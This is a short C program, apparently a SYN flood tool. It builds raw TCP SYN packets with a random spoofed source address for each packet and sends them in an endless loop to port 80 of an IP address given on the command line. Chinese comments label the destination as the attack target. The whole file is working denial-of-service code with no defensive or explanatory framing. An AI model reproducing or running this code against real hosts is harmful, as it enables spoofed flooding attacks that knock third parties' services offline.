#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#define LOCALPORT 3455
#include <stdlib.h>
#define DESTPORT 80
#define MYPORT 8888

int main(int argc, char const *argv[])
{
    int sockfd;
    struct sockaddr_in addr;
    int on;
    printf("comes in\n");
    if(argc != 2){
        fprintf(stderr, "usage: %s IP\n\a", argv[0]);
        exit(1);
    }
    bzero(&addr, sizeof(struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(DESTPORT);
    inet_aton(argv[1], &addr.sin_addr);
    /* create a raw socket for TCP */
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(sockfd < 0){
        perror("socket error\n");
        exit(1);
    }
    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    setuid(getuid());
    char buffer[100];
    struct ip *ipp;
    struct tcphdr *tcp;
    int head_len;
    head_len = sizeof(struct ip) + sizeof(struct tcphdr);
    bzero(buffer,100);
    ipp=(struct ip *)buffer;
    ipp->ip_v=IPVERSION; /*IPV4*/
    ipp->ip_hl=sizeof(struct ip)>>2;/*IP数据报的头部长度*/
    ipp->ip_tos=0;               /*服务类型*/
    ipp->ip_len=htons(head_len);/*IP数据报的长度*/
    ipp->ip_id=0;             /*IP id 由内核填写*/
    ipp->ip_off=0;      /*有内核填写*/
    ipp->ip_ttl=MAXTTL;
    ipp->ip_p=IPPROTO_TCP;         /*传输层协议为TCP*/
    ipp->ip_dst=addr.sin_addr;     /*目的地址，即攻击目标*/
    printf("dest address is %s\n",inet_ntoa(addr.sin_addr));
    tcp=(struct tcphdr*)(buffer+sizeof(struct ip));
    tcp->source=htons(LOCALPORT);
    tcp->dest=addr.sin_port; /*目的端口*/
    tcp->seq=random();      /*随机产生序列号*/
    tcp->ack_seq=0;
    tcp->doff=5;
    tcp->syn=1; /*表示SYN数据报*/
    tcp->check=0;
    while(1){
        ipp->ip_src.s_addr=random();
        printf("tcp dst port is %d\n", ntohs(tcp->dest));
        printf("addr is %d\n",ipp->ip_src.s_addr);
        sendto(sockfd,buffer,head_len,0,(struct sockaddr *)&addr,sizeof(struct sockaddr));
    }
    return 0;
}
